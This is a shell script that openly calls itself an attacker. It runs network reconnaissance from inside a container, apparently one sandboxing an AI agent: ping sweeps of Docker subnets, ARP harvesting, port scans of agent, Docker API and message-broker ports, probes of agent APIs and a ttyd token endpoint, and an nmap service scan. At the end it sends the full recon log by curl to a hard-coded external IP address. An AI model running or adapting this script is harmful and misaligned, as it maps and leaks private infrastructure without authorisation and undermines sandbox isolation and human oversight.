#!/bin/sh
set -e
LOG=/tmp/attacker.log
exec > "$LOG" 2>&1

VPS="http://147.45.231.59:9999"

apk add --no-cache curl iproute2 python3 nmap >/dev/null 2>&1

echo "=== ip addr ==="
ip addr
echo "=== ip route ==="
ip route
GW=$(ip route | awk '/default/{print $3; exit}')
OUR_IFACE=$(ip route | awk '/default/{print $5; exit}')
OUR_IP=$(ip -4 addr show "$OUR_IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)

echo "OUR_IP=$OUR_IP GW=$GW IFACE=$OUR_IFACE"

ping -c 2 -W 1 "$GW" >/dev/null 2>/dev/null || true
for net in 172.17.0 172.18.0 172.19.0 172.20.0; do
  for i in 1 2 3 4 5 6 7 8; do
    ping -c 1 -W 1 "${net}.${i}" >/dev/null 2>/dev/null &
  done
done
wait
sleep 2
ip neigh > /tmp/neigh.txt
echo "=== neighbors ==="
cat /tmp/neigh.txt

echo "=== cross-bridge route test ==="
for ip in 172.18.0.1 172.18.0.2 172.18.0.3 172.18.0.4 172.18.0.5; do
  result=$(ping -c 1 -W 2 "$ip" 2>&1 && echo "REACHABLE" || echo "UNREACHABLE")
  echo "$ip: $result"
done

echo "=== ARP scan docker0 neighbors ==="
OUR_MAC=$(ip link show "$OUR_IFACE" | awk '/link\/ether/{print $2}' | tr -d ':')
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1 | tr -d ':')

CANDIDATES=""
while read line; do
  ip_addr=$(echo "$line" | awk '{print $1}')
  mac=$(echo "$line" | awk '{print $5}')
  state=$(echo "$line" | awk '{print $NF}')
  [ "$ip_addr" = "$GW" ] && continue
  [ "$ip_addr" = "$OUR_IP" ] && continue
  [ -z "$mac" ] && continue
  mac_clean=$(echo "$mac" | tr -d ':')
  [ "$mac_clean" = "$OUR_MAC" ] && continue
  case "$state" in
    REACHABLE|STALE|DELAY|PROBE)
      CANDIDATES="$CANDIDATES $ip_addr"
      echo "Candidate: $ip_addr mac=$mac_clean"
      ;;
  esac
done < /tmp/neigh.txt

echo "=== PORT SCAN: key agent ports on each candidate ==="
for cand in $CANDIDATES; do
  echo "--- scanning $cand ---"
  for port in 8000 27110 5672 9090 9200 2375 2376 80 443 8080; do
    timeout 2 sh -c "echo | nc -w1 $cand $port" >/dev/null 2>&1 && echo "  $cand:$port OPEN" || echo "  $cand:$port closed"
  done
done

echo "=== PORT SCAN: agent-network IPs (if routable) ==="
for cand in 172.18.0.2 172.18.0.3 172.18.0.4; do
  echo "--- scanning $cand ---"
  for port in 8000 27110 5672 9090 9200; do
    timeout 2 sh -c "echo | nc -w1 $cand $port" >/dev/null 2>&1 && echo "  $cand:$port OPEN" || echo "  $cand:$port closed"
  done
done

echo "=== HTTP PROBE: agent API ==="
for cand in $CANDIDATES 172.18.0.2; do
  for port in 8000 27110; do
    echo "--- $cand:$port ---"
    resp=$(curl -sS --max-time 3 "http://$cand:$port/" 2>&1 || echo "FAIL")
    echo "  GET /: $resp" | head -5
    resp=$(curl -sS --max-time 3 "http://$cand:$port/docs" 2>&1 || echo "FAIL")
    echo "  GET /docs: $(echo "$resp" | head -3)"
    resp=$(curl -sS --max-time 3 "http://$cand:$port/openapi.json" 2>&1 || echo "FAIL")
    echo "  GET /openapi.json: $(echo "$resp" | head -5)"
    resp=$(curl -sS --max-time 3 "http://$cand:$port/health" 2>&1 || echo "FAIL")
    echo "  GET /health: $resp" | head -3
  done
done

echo "=== TTYD PROBE ==="
for cand in $CANDIDATES 172.18.0.2; do
  for port in 27110; do
    resp=$(curl -sS --max-time 3 "http://$cand:$port/token" 2>&1 || echo "FAIL")
    echo "  $cand:$port /token: $resp"
  done
done

echo "=== Caddy metrics probe ==="
for cand in $CANDIDATES 172.18.0.2 172.18.0.4; do
  for port in 9090 2019; do
    resp=$(curl -sS --max-time 3 "http://$cand:$port/metrics" 2>&1 | head -5 || echo "FAIL")
    echo "  $cand:$port /metrics: $resp"
  done
done

echo "=== NMAP service scan on most active candidate ==="
AGENT_CAND=$(head -1 /tmp/neigh.txt | awk '{print $1}')
[ -n "$AGENT_CAND" ] && [ "$AGENT_CAND" != "$GW" ] || AGENT_CAND=$(echo "$CANDIDATES" | awk '{print $1}')
if [ -n "$AGENT_CAND" ]; then
  nmap -sV -p 1-10000 --open "$AGENT_CAND" -oN /tmp/nmap_svc.txt 2>/dev/null || true
  echo "--- nmap results for $AGENT_CAND ---"
  cat /tmp/nmap_svc.txt 2>/dev/null
fi

echo ""
echo "=== FINAL REPORT ==="
{
  echo "=== recon ==="
  echo "IFACE=$OUR_IFACE OUR_IP=$OUR_IP OUR_MAC=$OUR_MAC"
  echo "GW=$GW GW_MAC=$GW_MAC"
  echo "CANDIDATES=$CANDIDATES"
  echo "=== neigh ==="
  cat /tmp/neigh.txt
  echo "=== full log ==="
  cat "$LOG" 2>/dev/null | tail -200
} | curl -sS --max-time 30 --data-binary @- "$VPS?tag=L1-RECON-V3"

sleep 999999
